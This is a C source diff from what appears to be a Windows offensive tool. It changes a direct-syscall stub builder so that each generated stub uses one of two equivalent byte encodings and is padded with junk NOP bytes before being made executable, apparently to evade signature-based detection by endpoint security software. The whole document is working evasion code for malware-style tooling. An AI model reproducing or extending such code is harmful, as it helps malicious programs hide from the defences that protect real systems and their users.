@@ -30,16 +30,29 @@ DWORD GetSyscallNumber(HMODULE hNtdll, PVOID pFunc)
 	return 0;
 }
 
-void BuildSyscallStub(BYTE* pStub, DWORD ssn)
+#define SYSCALL_STUB_SIZE  16
+
+void BuildSyscallStub(BYTE* pStub, DWORD ssn, ULONG variant)
 {
-	pStub[0]  = 0x4C;
-	pStub[1]  = 0x8B;
-	pStub[2]  = 0xD1;
+	if (variant & 1) {
+		pStub[0]  = 0x4C;
+		pStub[1]  = 0x8B;
+		pStub[2]  = 0xD1;
+	} else {
+		pStub[0]  = 0x51;
+		pStub[1]  = 0x41;
+		pStub[2]  = 0x5A;
+	}
 	pStub[3]  = 0xB8;
 	*(DWORD*)(pStub + 4) = ssn;
 	pStub[8]  = 0x0F;
 	pStub[9]  = 0x05;
 	pStub[10] = 0xC3;
+	pStub[11] = 0x87;  // xchg eax, eax (junk NOP)
+	pStub[12] = 0xC0;
+	pStub[13] = 0x90;  // NOP
+	pStub[14] = 0x90;  // NOP
+	pStub[15] = 0x90;  // NOP
 }
 
 static BOOL ResolveSyscallEntry(SYSCALL_ENTRY* entry, HMODULE hNtdll, ULONG hash)
@@ -57,7 +70,7 @@ static BOOL ResolveSyscallEntry(SYSCALL_ENTRY* entry, HMODULE hNtdll, ULONG hash
 	if (!stub)
 		return FALSE;
 
-	BuildSyscallStub(stub, ssn);
+	BuildSyscallStub(stub, ssn, ssn & 3);
 
 	DWORD oldProt;
 	ApiWin->VirtualProtect(stub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &oldProt);
